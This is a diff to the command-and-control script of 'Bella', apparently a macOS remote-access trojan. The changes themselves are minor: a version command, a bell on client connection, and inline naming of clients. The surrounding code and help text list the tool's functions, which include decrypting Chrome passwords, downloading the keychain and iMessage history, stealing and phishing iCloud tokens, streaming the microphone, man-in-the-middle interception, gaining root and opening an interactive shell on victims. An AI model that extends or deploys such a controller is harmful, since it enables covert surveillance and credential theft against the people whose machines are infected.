@@ -32,10 +32,11 @@ greenCheck = "%s[+] %s" % (green, endC)
 bluePlus = "%s[*] %s" % (blue, endC)
 yellow_star = "%s[*] %s" % (yellow, endC)
 
-commands = ['iCloud_query', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
+commands = ['iCloud_query', 'bella_version', 'set_client_name', 'update_server', 'interactive_shell','upload', 'download', 'screen_shot', 'iCloud_contacts', 'iCloud_FMF', 'chrome_dump', 'shutdown_server', 'iCloud_FMIP', 'chrome_safe_storage', 'insomnia_load', 'insomnia_unload', 'iCloud_token', 'iCloud_phish', 'mike_stream', 'reboot_server', 'safari_history', 'check_backups','keychain_download', 'mitm_start', 'mitm_kill', 'chat_history', 'get_root', 'bella_info', 'current_users', 'sysinfo', 'user_pass_phish', 'removeserver_yes']
 
 def manual():
-	value = "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
+    value = "\n%sBella Version%s\nReturn Bella's version / release number.\nUsage: %sbella_version%s\nRequirements: None\n" % (underline + bold + yellow, endANSI, bold, endANSI)
+	value += "\n%sChat History%s\nDownload the user's macOS iMessage database.\nUsage: %schat_history%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sCheck Backups%s\nEnumerate the user's local iOS backups.\nUsage: %scheck_backups%s\nRequirements: None\n" % (underline + bold + light_blue, endANSI, bold, endANSI)
 	value += "\n%sChrome Dump%s\nDecrypt user passwords stored in Google Chrome profiles.\nUsage: %schrome_dump%s\nRequirements: Chrome SS Key [see chrome_safe_storage]\n" % (underline + bold + green, endANSI, bold, endANSI)
 	value += "\n%sChrome Safe Storage%s\nPrompt the keychain to present the user's Chrome Safe Storage Key.\nUsage: %schrome_safe_storage%s\nRequirements: None\n" % (underline + bold + green, endANSI, bold, endANSI)
@@ -187,6 +188,7 @@ def main():
     ctrlC = False
     active=False
     first_run = True
+    cc_version = '1.10'
     logpath = 'Logs/'
     helperpath = ''
     client_log_path = ''
@@ -242,7 +244,7 @@ def main():
                 connections +=[sock]
                 clients += [accept]
             clear() #see how many more we can accept, clear
-            print "%s%s%s%s\n" % (purple, bold, 'Found clients!'.center(columns, ' '), endC)
+            print "%s%s%s%s%s\n" % ("\a",purple, bold, 'Found clients!'.center(columns, ' '), endC) # the \a is the bell, remove if annoying.
             if len(clients)>0:
                 dater=[]
                 colorIndex = 0
@@ -560,6 +562,9 @@ def main():
                         file_list = commands
                         nextcmd = ""
 
+                    if nextcmd == "bella_version":
+                        print "%sControl Center Version:%s %s" % (underline, endC, cc_version)
+
                     if nextcmd == ("mitm_start"):
                         try:
                             import mitmproxy
@@ -603,8 +608,11 @@ def main():
                     if nextcmd == "restart":
                         nextcmd = "osascript -e 'tell application \"System Events\" to restart'"
 
-                    if nextcmd == "set_client_name":
-                        nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
+                    if nextcmd.startswith("set_client_name"):
+                        if nextcmd == "set_client_name":
+                            nextcmd += ":::" + (raw_input("🐷  Please specify a client name: ") or computername)
+                        else:
+                            nextcmd = "set_client_name:::%s" % nextcmd.replace('set_client_name ', '')
 
                     if nextcmd == "update_server":
                         if nextcmd == "update_server": #no stdin
